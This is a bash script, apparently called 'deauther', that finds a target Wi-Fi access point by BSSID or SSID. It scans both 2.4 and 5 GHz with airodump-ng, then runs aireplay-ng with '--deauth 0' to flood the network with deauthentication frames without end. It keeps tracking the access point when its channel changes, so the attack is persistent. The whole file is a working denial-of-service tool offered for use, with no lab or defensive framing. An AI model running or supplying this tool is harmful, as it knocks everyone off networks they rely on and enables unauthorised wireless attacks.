#!/usr/bin/env bash

set -euo pipefail

############################################
# Defaults / Globals
############################################
DEFAULT_IFACES=( "wlan0" "wlan1" )
INTERFACE=""
TARGET_BSSID=""
TARGET_SSID=""

# Unique per-instance temp directory to avoid collisions between multiple runs
INSTANCE_DIR="$(mktemp -d /tmp/deauther.$(date +%s).$$.XXXXXX)"
CSV_PREFIX="${INSTANCE_DIR}/scan"   # airodump-ng will create scan-01.csv etc here

SCAN_TIMEOUT=20          # hard cap per full scan round (seconds)
QUICK_CONFIRM=5          # quick confirm on known channel (seconds)
SLEEP_BETWEEN=0.5
DEAUTH_PGID=""           # process group ID for aireplay-ng (negative PID to signal group)
DEAUTH_PID=""            # leader PID for aireplay-ng
SCAN_PGID=""             # process group ID for airodump-ng (negative PID to signal group)
SCAN_PID=""              # leader PID for airodump-ng
CURRENT_CH=""            # last channel we deauthed on
CURRENT_BSSID=""         # last BSSID we deauthed on
_CLEANED_ONCE=0          # guard to avoid duplicate cleanup

############################################
# Helpers
############################################
usage() {
  cat <<EOF
Usage: $0 -bssid AA:BB:CC:DD:EE:FF [-ssid "MyWiFi"] [-i IFACE]
   or: $0 -ssid "MyWiFi" [-i IFACE]

At least one of -bssid or -ssid must be provided.

Options:
  -bssid   Target AP BSSID (MAC), e.g., AA:BB:CC:DD:EE:FF
  -ssid    Target AP SSID (ESSID), e.g., MyWiFi
  -i       Monitor-capable interface (optional). Defaults to:
           wlan0, else wlan1
  -h       Show this help
EOF
}

need_cmd() {
  command -v "$1" >/dev/null 2>&1 || { echo "Missing command: $1" >&2; exit 1; }
}

iface_exists() {
  ip link show dev "$1" >/dev/null 2>&1
}

pick_default_iface() {
  for ifc in "${DEFAULT_IFACES[@]}"; do
    if iface_exists "$ifc"; then
      INTERFACE="$ifc"
      return 0
    fi
  done
  return 1
}

get_iface_type() {
  iw dev "$1" info 2>/dev/null | awk '/type/ {print $2; exit}'
}

ensure_monitor() {
  local ifc="$1"
  local t
  t="$(get_iface_type "$ifc" || true)"
  if [[ "$t" == "monitor" ]]; then
    return 0
  fi
  echo "[*] Switching $ifc to monitor mode..."
  ip link set "$ifc" down || true
  if ! iw dev "$ifc" set type monitor 2>/dev/null; then
    echo "[!] Failed to set $ifc to monitor mode" >&2
    return 1
  fi
  ip link set "$ifc" up || true
  t="$(get_iface_type "$ifc" || true)"
  if [[ "$t" != "monitor" ]]; then
    echo "[!] Monitor mode verification failed on $ifc (type=$t)" >&2
    return 1
  fi
  return 0
}

uppercase_mac() {
  echo "$1" | tr '[:lower:]' '[:upper:]'
}

latest_csv() {
  # echo path to newest CSV for this instance, or empty
  ls -1t "${CSV_PREFIX}-"*.csv 2>/dev/null | head -n1 || true
}

clean_csv() {
  rm -f "${CSV_PREFIX}-"*.csv 2>/dev/null || true
}

# Strong killer: always ends with SIGKILL (-9)
kill_group_strong() {
  local pgid="${1:-}"
  local pid="${2:-}"
  [[ -z "$pgid" && -z "$pid" ]] && return 0
  # Try graceful first
  [[ -n "$pgid" ]] && kill -INT "$pgid" 2>/dev/null || true
  [[ -n "$pid"  ]] && kill -INT "$pid"  2>/dev/null || true
  sleep 0.15
  [[ -n "$pgid" ]] && kill -TERM "$pgid" 2>/dev/null || true
  [[ -n "$pid"  ]] && kill -TERM "$pid"  2>/dev/null || true
  sleep 0.15
  # Force-kill (-9)
  [[ -n "$pgid" ]] && kill -KILL "$pgid" 2>/dev/null || true
  [[ -n "$pid"  ]] && kill -KILL "$pid"  2>/dev/null || true
}

cleanup_once() {
  # guard to avoid duplicate execution (INT then EXIT)
  if [[ "${_CLEANED_ONCE}" -eq 1 ]]; then
    return 0
  fi
  _CLEANED_ONCE=1
  echo "[*] Cleaning up and exiting..."
  kill_group_strong "$DEAUTH_PGID" "$DEAUTH_PID"
  kill_group_strong "$SCAN_PGID"   "$SCAN_PID"
  # Kill any leftover children of this script only
  pkill -9 -P $$ 2>/dev/null || true
  # Remove our instance temp dir
  rm -rf "$INSTANCE_DIR" 2>/dev/null || true
}

cleanup_and_exit() {
  local why="${1:-}"
  cleanup_once
  # Do not 'exit' from EXIT trap to avoid re-entry; only exit when not called by EXIT
  if [[ "$why" != "EXIT" ]]; then
    exit 0
  fi
}

############################################
# Scan parsing
# CSV format (AP table):
#   0 BSSID, 3 channel, 13 ESSID
############################################
parse_csv_for_ap() {
  # args: csv_file, want_bssid, want_ssid
  # prints: "BSSID,CHANNEL" if match found; else nothing
  local csv="$1" want_bssid="$2" want_ssid="$3"
  [[ -f "$csv" ]] || return 1
  # Use awk to parse only the AP table between header "BSSID" and "Station MAC"
  awk -F',' -v WB="$(uppercase_mac "$want_bssid")" -v WS="$want_ssid" '
    function trim(x){ gsub(/^[ \t]+|[ \t]+$/, "", x); return x }
    BEGIN { in_ap=0; found=0 }
    $1 ~ /^BSSID$/        { in_ap=1; next }
    $1 ~ /^Station MAC$/  { in_ap=0; exit }
    in_ap {
      bssid = toupper(trim($1));
      ch    = trim($4);
      essid = trim($14);
      ok=1
      if (WB != "" && bssid != toupper(WB)) ok=0
      if (WS != "" && essid != WS) ok=0
      if (ok) {
        print bssid "," ch
        found=1
        exit
      }
    }
  ' "$csv"
}

############################################
# Airodump launcher with early-exit (hard-kill on stop)
# Scans both 2.4GHz and 5GHz bands: --band abg
############################################
run_airodump_until_found() {
  # args: iface, want_bssid, want_ssid, hard_timeout_s, channel_hint(optional)
  # echos: "BSSID,CHANNEL" if found; returns 0 on found, 1 on not found by timeout
  local ifc="$1" want_bssid="$2" want_ssid="$3" hard_t="$4" ch_hint="${5:-}"
  ensure_monitor "$ifc" || return 1

  clean_csv

  # Build command; if we have a channel hint, lock to it for speed
  local cmd=( airodump-ng --output-format csv --write-interval 1 -w "$CSV_PREFIX" )
  if [[ -n "$ch_hint" ]]; then
    cmd+=( --channel "$ch_hint" )
  else
    # Scan all bands (2.4 and 5GHz)
    cmd+=( --band abg )
  fi
  # BSSID filter speeds things up if known
  if [[ -n "$want_bssid" ]]; then
    cmd+=( --bssid "$want_bssid" )
  fi
  cmd+=( "$ifc" )

  # Start in its own process group so we can signal the whole group
  setsid "${cmd[@]}" >/dev/null 2>&1 &
  SCAN_PID="$!"
  SCAN_PGID="-$SCAN_PID"

  # Poll for match up to hard_t seconds; kill early on success
  local start_t now_t elapsed csv ap
  start_t="$(date +%s)"
  while :; do
    csv="$(latest_csv)"
    if [[ -n "$csv" ]]; then
      ap="$(parse_csv_for_ap "$csv" "$want_bssid" "$want_ssid" || true)"
      if [[ -n "$ap" ]]; then
        # Found. Hard-stop airodump with -9.
        kill_group_strong "$SCAN_PGID" "$SCAN_PID"
        SCAN_PGID=""; SCAN_PID=""
        echo "$ap"
        return 0
      fi
    fi
    now_t="$(date +%s)"
    elapsed=$(( now_t - start_t ))
    if (( elapsed >= hard_t )); then
      # Timed out. Hard-stop airodump.
      kill_group_strong "$SCAN_PGID" "$SCAN_PID"
      SCAN_PGID=""; SCAN_PID=""
      return 1
    fi
    sleep 0.3
  done
}

############################################
# Deauth control
############################################
stop_deauth() {
  if [[ -n "$DEAUTH_PGID" || -n "$DEAUTH_PID" ]]; then
    echo "[*] Stopping deauth..."
    kill_group_strong "$DEAUTH_PGID" "$DEAUTH_PID"
    DEAUTH_PGID=""; DEAUTH_PID=""
  fi
}

start_deauth() {
  # args: iface, bssid, channel
  local ifc="$1" bssid="$2" ch="$3"
  echo "[*] Setting $ifc to channel $ch and starting deauth on $bssid..."
  iw dev "$ifc" set channel "$ch" || { echo "[!] Failed to set channel $ch" >&2; return 1; }
  # Use infinite deauth (--deauth 0) so it keeps running until we stop it.
  # Start in its own process group so we can kill easily.
  setsid aireplay-ng --deauth 0 -a "$bssid" "$ifc" >/dev/null 2>&1 &
  DEAUTH_PID="$!"
  DEAUTH_PGID="-$DEAUTH_PID"
  CURRENT_CH="$ch"
  CURRENT_BSSID="$bssid"
  echo "[*] Deauth started on ch $CURRENT_CH for $CURRENT_BSSID"
}

############################################
# Arg parsing
############################################
if [[ $# -eq 0 ]]; then
  usage; exit 1
fi

while [[ $# -gt 0 ]]; do
  case "$1" in
    -bssid) TARGET_BSSID="${2:-}"; shift 2 ;;
    -ssid)  TARGET_SSID="${2:-}";  shift 2 ;;
    -i)     INTERFACE="${2:-}";    shift 2 ;;
    -h|--help) usage; exit 0 ;;
    *) echo "Unknown arg: $1" >&2; usage; exit 1 ;;
  esac
done

if [[ -z "$TARGET_BSSID" && -z "$TARGET_SSID" ]]; then
  echo "[!] You must provide at least one of -bssid or -ssid" >&2
  usage; exit 1
fi

# Validate / pick interface
if [[ -n "$INTERFACE" ]]; then
  if ! iface_exists "$INTERFACE"; then
    echo "[!] Interface $INTERFACE not found" >&2
    exit 1
  fi
else
  if ! pick_default_iface; then
    echo "[!] No interface found (tried: ${DEFAULT_IFACES[*]}). Use -i IFACE." >&2
    exit 1
  fi
fi

# Normalize BSSID to uppercase if present
if [[ -n "$TARGET_BSSID" ]]; then
  TARGET_BSSID="$(uppercase_mac "$TARGET_BSSID")"
fi

echo "[INIT] Instance temp dir: $INSTANCE_DIR"
echo "[INIT] Interface: $INTERFACE"
echo "[INIT] Target BSSID: ${TARGET_BSSID:-<none>}"
echo "[INIT] Target SSID : ${TARGET_SSID:-<none>}"

need_cmd iw
need_cmd airodump-ng
need_cmd aireplay-ng
need_cmd awk
need_cmd setsid

# Ensure all children die on Ctrl+C/TERM and also on EXIT (but only once)
trap 'cleanup_and_exit INT'  INT
trap 'cleanup_and_exit TERM' TERM
trap 'cleanup_and_exit EXIT' EXIT

############################################
# Main loop
############################################
KNOWN_CH=""
KNOWN_BSSID="$TARGET_BSSID"

while true; do
  ensure_monitor "$INTERFACE" || { echo "[!] Monitor mode unavailable... retrying..."; sleep 1; continue; }

  # 1) Quick confirm on known channel (if any), short timeout
  FOUND_LINE=""
  if [[ -n "${KNOWN_CH:-}" || -n "${CURRENT_CH:-}" ]]; then
    local_ch="${KNOWN_CH:-$CURRENT_CH}"
    echo "[SCAN] Quick confirm on ch $local_ch..."
    if output="$(run_airodump_until_found "$INTERFACE" "$KNOWN_BSSID" "$TARGET_SSID" "$QUICK_CONFIRM" "$local_ch")"; then
      FOUND_LINE="$output"
    fi
  fi

  # 2) If not found in quick confirm, do a full scan up to SCAN_TIMEOUT across all bands
  if [[ -z "$FOUND_LINE" ]]; then
    echo "[SCAN] Full scan (up to ${SCAN_TIMEOUT}s) across 2.4/5GHz..."
    if output="$(run_airodump_until_found "$INTERFACE" "$KNOWN_BSSID" "$TARGET_SSID" "$SCAN_TIMEOUT")"; then
      FOUND_LINE="$output"
    fi
  fi

  if [[ -n "$FOUND_LINE" ]]; then
    # Parse "BSSID,CHANNEL"
    NEW_BSSID="$(echo "$FOUND_LINE" | awk -F',' '{print $1}')"
    RAW_CH="$(echo "$FOUND_LINE" | awk -F',' '{gsub(/ /,"",$2); print $2}')"
    if [[ "$RAW_CH" =~ ^[0-9]+$ ]]; then
      NEW_CH="$RAW_CH"
    else
      NEW_CH="$(echo "$RAW_CH" | grep -Eo '[0-9]+' | head -n1 || true)"
    fi

    if [[ -z "$NEW_CH" ]]; then
      echo "[SCAN] Found AP but channel unreadable... will retry..."
      stop_deauth
      sleep "$SLEEP_BETWEEN"
      continue
    fi

    # Update knowns
    KNOWN_CH="$NEW_CH"
    KNOWN_BSSID="$NEW_BSSID"

    # Decide deauth (start/restart if needed)
    if [[ -z "$DEAUTH_PGID" ]]; then
      start_deauth "$INTERFACE" "$KNOWN_BSSID" "$KNOWN_CH" || true
    else
      if [[ "$CURRENT_CH" != "$KNOWN_CH" || "$CURRENT_BSSID" != "$KNOWN_BSSID" ]]; then
        echo "[*] Channel/BSSID changed ($CURRENT_CH/$CURRENT_BSSID -> $KNOWN_CH/$KNOWN_BSSID)... restarting deauth..."
        stop_deauth
        start_deauth "$INTERFACE" "$KNOWN_BSSID" "$KNOWN_CH" || true
      else
        # Already deauthing on correct ch
        :
      fi
    fi
  else
    echo "[SCAN] Target not found this round."
    # Stop deauth if running
    stop_deauth
  fi

  sleep "$SLEEP_BETWEEN"
done
